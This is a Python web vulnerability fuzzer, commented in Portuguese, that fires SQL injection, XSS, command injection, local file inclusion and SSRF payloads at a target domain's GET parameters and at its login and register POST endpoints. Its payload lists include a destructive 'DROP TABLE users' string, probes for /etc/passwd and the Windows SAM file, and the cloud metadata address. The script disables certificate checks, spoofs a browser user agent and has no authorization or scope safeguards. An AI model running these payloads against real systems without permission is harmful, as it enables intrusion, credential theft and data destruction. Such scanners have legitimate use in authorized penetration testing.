#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Parameter Fuzzer — Testa parametros de entrada para vulnerabilidades
SQLi, XSS, Command Injection, LFI, SSRF
"""

import sys
import json
import ssl
import urllib.request
import urllib.error
import re
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urljoin


class ParameterFuzzer:
    """Fuzzer de parametros para detectar vulnerabilidades"""

    # Payloads SQL Injection
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' OR '1'='1' --",
        "admin'--",
        "1; DROP TABLE users--",
        "' AND 1=1 UNION SELECT NULL--",
        "' AND SLEEP(5)--",
    ]

    # Payloads XSS
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
    ]

    # Payloads Command Injection
    CMDI_PAYLOADS = [
        '; id',
        '| id',
        '&& id',
        '`id`',
        '$(id)',
        '%0aid',
        '; whoami',
        '| whoami',
    ]

    # Payloads LFI/RFI
    LFI_PAYLOADS = [
        '../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '%2e%2e/%2e%2e/etc/passwd',
        '....//....//etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
    ]

    # Payloads SSRF
    SSRF_PAYLOADS = [
        'http://169.254.169.254/latest/meta-data/',
        'http://localhost:8080/',
        'http://127.0.0.1:22/',
        'file:///etc/passwd',
        'gopher://127.0.0.1:6379/',
    ]

    # Signais de vulnerabilidade nas respostas
    VULN_SIGNATURES = {
        'sqli': [
            'sql syntax', 'mysql_fetch', 'mysqli_', 'odbc sql',
            'oracle error', 'postgresql', 'unclosed quotation',
            'sql server', 'you have an error in your sql',
            'sqlite3', 'syntax error', 'warning: mysql',
        ],
        'xss': [
            '<script>alert', '<img src=x onerror', '<svg onload',
        ],
        'cmdi': [
            'uid=', 'gid=', 'groups=', 'root:', 'bin/bash',
            'windows\system32', 'program files',
        ],
        'lfi': [
            'root:', ':/bin/', ':/sbin/', '<?php', 'Base64',
            'PHNhbXBsZT4',  # Base64 of "<sample>"
        ],
        'ssrf': [
            'ami-id', 'instance-id', 'aws', 'localhost',
            '169.254.169.254', 'metadata',
        ],
    }

    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        self.findings: List[Dict] = []

    def _fetch(self, url: str, params: Dict = None) -> Tuple[int, str, Dict]:
        """Fetch URL with optional params"""
        full_url = url
        if params:
            query = urlencode(params)
            full_url = f"{url}?{query}" if '?' not in url else f"{url}&{query}"

        try:
            req = urllib.request.Request(full_url, headers={'User-Agent': self.user_agent})
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='ignore')[:500] if e.fp else ''
            return e.code, body, dict(e.headers) if e.headers else {}
        except Exception as e:
            return 0, str(e), {}

    def _check_response(self, body: str, vuln_type: str) -> Optional[str]:
        """Check if response indicates vulnerability"""
        body_lower = body.lower()
        for sig in self.VULN_SIGNATURES.get(vuln_type, []):
            if sig.lower() in body_lower:
                return sig
        return None

    def fuzz_get_params(self, base_url: str, max_params: int = 10) -> List[Dict]:
        """Fuzz GET parameters"""
        print(f"\n  [FUZZ] Testing GET parameters on {base_url}")

        # Parse existing params
        parsed = urlparse(base_url)
        existing_params = parse_qs(parsed.query)

        # Determine param names to test
        param_names = list(existing_params.keys())[:max_params]
        if not param_names:
            # Try common param names
            param_names = ['id', 'user', 'page', 'search', 'q', 'filter', 'order', 'sort']

        print(f"  [FUZZ] Testing {len(param_names)} parameters")

        for param in param_names:
            # Test SQLi
            for payload in self.SQLI_PAYLOADS[:3]:
                params = {param: payload}
                status, body, headers = self._fetch(base_url, params)

                sig = self._check_response(body, 'sqli')
                if sig:
                    finding = {
                        'type': 'SQL Injection',
                        'severity': 'CRITICAL',
                        'url': f"{base_url}?{param}={payload}",
                        'param': param,
                        'payload': payload,
                        'signature': sig,
                        'status': status,
                    }
                    self.findings.append(finding)
                    print(f"    [SQLi] {param}={payload[:30]}... -> {sig}")

            # Test XSS
            for payload in self.XSS_PAYLOADS[:2]:
                params = {param: payload}
                status, body, headers = self._fetch(base_url, params)

                sig = self._check_response(body, 'xss')
                if sig:
                    finding = {
                        'type': 'XSS',
                        'severity': 'HIGH',
                        'url': f"{base_url}?{param}={payload}",
                        'param': param,
                        'payload': payload,
                        'signature': sig,
                        'status': status,
                    }
                    self.findings.append(finding)
                    print(f"    [XSS] {param}={payload[:30]}... -> reflected")

            # Test LFI
            if any(x in param.lower() for x in ['file', 'path', 'page', 'include', 'doc']):
                for payload in self.LFI_PAYLOADS[:2]:
                    params = {param: payload}
                    status, body, headers = self._fetch(base_url, params)

                    sig = self._check_response(body, 'lfi')
                    if sig:
                        finding = {
                            'type': 'LFI',
                            'severity': 'CRITICAL',
                            'url': f"{base_url}?{param}={payload}",
                            'param': param,
                            'payload': payload,
                            'signature': sig,
                            'status': status,
                        }
                        self.findings.append(finding)
                        print(f"    [LFI] {param}={payload[:30]}... -> {sig}")

            # Test SSRF
            if any(x in param.lower() for x in ['url', 'link', 'redirect', 'return', 'next', 'dest']):
                for payload in self.SSRF_PAYLOADS[:2]:
                    params = {param: payload}
                    status, body, headers = self._fetch(base_url, params)

                    sig = self._check_response(body, 'ssrf')
                    if sig:
                        finding = {
                            'type': 'SSRF',
                            'severity': 'CRITICAL',
                            'url': f"{base_url}?{param}={payload}",
                            'param': param,
                            'payload': payload,
                            'signature': sig,
                            'status': status,
                        }
                        self.findings.append(finding)
                        print(f"    [SSRF] {param}={payload[:30]}... -> {sig}")

        return self.findings

    def fuzz_post_params(self, url: str, params: Dict = None,
                         max_params: int = 5) -> List[Dict]:
        """Fuzz POST parameters"""
        print(f"\n  [FUZZ] Testing POST parameters on {url}")

        if not params:
            params = {'id': '', 'user': '', 'search': '', 'q': ''}

        test_params = dict(params)
        for key in list(test_params.keys())[:max_params]:
            # Test SQLi
            for payload in self.SQLI_PAYLOADS[:2]:
                test_params[key] = payload
                try:
                    data = urlencode(test_params).encode()
                    req = urllib.request.Request(url, data=data, headers={
                        'User-Agent': self.user_agent,
                        'Content-Type': 'application/x-www-form-urlencoded',
                    })
                    with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        sig = self._check_response(body, 'sqli')
                        if sig:
                            finding = {
                                'type': 'SQL Injection (POST)',
                                'severity': 'CRITICAL',
                                'url': url,
                                'param': key,
                                'payload': payload,
                                'signature': sig,
                                'method': 'POST',
                            }
                            self.findings.append(finding)
                            print(f"    [POST SQLi] {key}={payload[:30]}... -> {sig}")
                except:
                    pass
            test_params[key] = ''  # Reset

        return self.findings

    def run_full_fuzz(self, urls: List[str] = None) -> Dict:
        """Run full fuzzing campaign"""
        print("\n" + "=" * 60)
        print("  PARAMETER FUZZER")
        print("=" * 60)

        if not urls:
            urls = [f"https://{self.target}"]

        for url in urls:
            self.fuzz_get_params(url)
            # Test POST on login/register if found
            for path in ['/login', '/register', '/api/login', '/api/register']:
                self.fuzz_post_params(f"{url.rstrip('/')}{path}")

        results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'findings': self.findings,
            'summary': {
                'total_findings': len(self.findings),
                'critical': len([f for f in self.findings if f.get('severity') == 'CRITICAL']),
                'high': len([f for f in self.findings if f.get('severity') == 'HIGH']),
                'medium': len([f for f in self.findings if f.get('severity') == 'MEDIUM']),
            }
        }

        print(f"\n  [RESULT] Found {len(self.findings)} vulnerability(ies)")

        return results


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Parameter Fuzzer')
    parser.add_argument('target', help='Target domain')
    parser.add_argument('--urls', '-u', nargs='*', help='Specific URLs to fuzz')
    parser.add_argument('--output', '-o', help='Output JSON file')

    args = parser.parse_args()

    fuzzer = ParameterFuzzer(args.target)
    result = fuzzer.run_full_fuzz(args.urls)

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False, default=str)
        print(f"\n[SAVE] Results saved to {args.output}")
    else:
        print(json.dumps(result, indent=2, ensure_ascii=False, default=str))


if __name__ == "__main__":
    main()
